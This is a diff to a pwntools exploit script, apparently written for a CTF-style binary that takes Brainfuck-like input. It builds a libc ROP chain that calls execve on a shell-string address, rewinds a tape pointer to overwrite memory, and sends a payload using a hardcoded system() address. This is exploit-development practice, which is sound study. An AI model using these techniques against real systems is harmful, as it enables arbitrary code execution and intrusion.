@@ -23,10 +23,13 @@ print(f"sh_addr: {hex(sh_addr)}")
 #print(f"puts plt: {puts_plt}")
 
 rop = ROP(libc)
-rop_addr = rop.eax.address
-#rop.execve(sh_addr,0,0)
-my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
-my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
+rop_addr = rop.ebx.address
+rop.execve(sh_addr,0,0)
+#my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
+#my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
+#0x000183a5
+#my_rop = rop.ebx.address
+my_rop = bytes(rop)
 print(f"ROP: {bytes(rop)}")
 print(f"DUMP: {rop.dump()}")
 # Start process
@@ -44,8 +47,9 @@ with open("payload", "w") as f:
 payload = ""
 payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += ",>,>,>," # putchar - for sending the last char
-payload += ".BBBB"*100 # call to puts()
+payload += ".CCaC"*100 # call to puts()
 payload += "[" # call to puts()
+payload += "[[[[[" # call to puts()
 payload +="\n"
 conn.send(payload)
 # 2nd part - the input to write ( the function to jump to ) 
@@ -57,9 +61,9 @@ with open("payload", "w+") as f:
 pop_eax_address = my_rop
 #print(f" POP: {hex(pop_eax_address)}")
 #payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
-payload = b''
-#payload = my_rop # pop eax  - I might need to call it like 0x128
-payload += p32(0xf7e55db0) # system()
+#payload = bytes(my_rop)
+payload = p32(0xf7e55db0) # system()
+payload += my_rop # pop eax  - I might need to call it like 0x128
 payload +=b"\n"
 conn.send(payload)
 with open("payload", "ab+") as f:
